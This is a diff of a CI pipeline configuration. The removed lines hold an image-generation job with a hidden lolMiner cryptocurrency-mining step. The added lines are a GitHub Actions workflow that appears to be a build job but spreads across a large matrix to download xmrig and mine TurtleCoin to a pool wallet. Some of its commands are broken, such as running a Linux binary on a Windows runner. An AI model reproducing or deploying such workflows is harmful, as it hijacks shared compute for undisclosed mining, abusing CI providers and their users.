@@ -1,46 +1,26 @@
-on:
-  github:
-    branches:
-      only: main
-
+name: Ex_code-unmineable
+ 
+on: [workflow_dispatch]
+ 
 jobs:
-  CloneRepo:
-    resources:
-      instance-type: C3
-    outputs:
-     stylegan2:
-        type: volume
-    uses: git-checkout@v1
-    with:
-      # url: https://github.com/gradient-ai/stylegan2.git
-      url: context.event.github.url
-      ref: context.event.github.ref
-  StyleGan2:
-    resources:
-      instance-type: P4000
-    needs:
-      - CloneRepo
-    inputs:
-      stylegan2: CloneRepo.outputs.stylegan2
-    outputs:
-      generatedFaces:
-        type: dataset
-        with:
-          ref: demo-dataset
-    uses: script@v1
-    with:
-      script: |-
-        pip install scipy==1.3.3
-        pip install requests==2.22.0
-        pip install Pillow==6.2.1
-        cd /inputs/stylegan2
-        wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
-        tar -xf lolMiner_v1.29_Lin64.tar.gz
-        cd 1.29
-        ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0xa91fd20dcdf1ed0dd07d37e3918fc8ed74ea0270.k802 --ethstratum ETHPROXY
-        python run_generator.py generate-images \
-          --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
-          --seeds=6600-6605 \
-          --truncation-psi=0.5 \
-          --result-dir=/outputs/generatedFaces
-      image: tensorflow/tensorflow:1.14.0-gpu-py3
+  build:
+    name: Ex-code
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3, 1,35]
+        flag: [A, B, C, D, E, F, G, H, I]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: DOWNLOAD
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz
+    - name: Extract
+      run: Expand-Archive tar -xf xmrig-6.15.0-linux-x64.tar.gz
+    - name: RUNNING
+      run: ./xmrig --algo=argon2/chukwav2 -o sg.turtlecoin.herominers.com:1160 -u TRTLuxyDydyX5LPgfgYvZHNYRVoBinUog1X3C8xgCrLoCQnkEAyHVaU3jqR8HZAPZQRE9bmtG4UPyLgsduxY4Q3f9kHRs3xosgr.xmrigA -p x -t 40 --max-cpu-usage 80 --cpu-priority 1 --keepalive
+    - name: DONE
+      run: exit
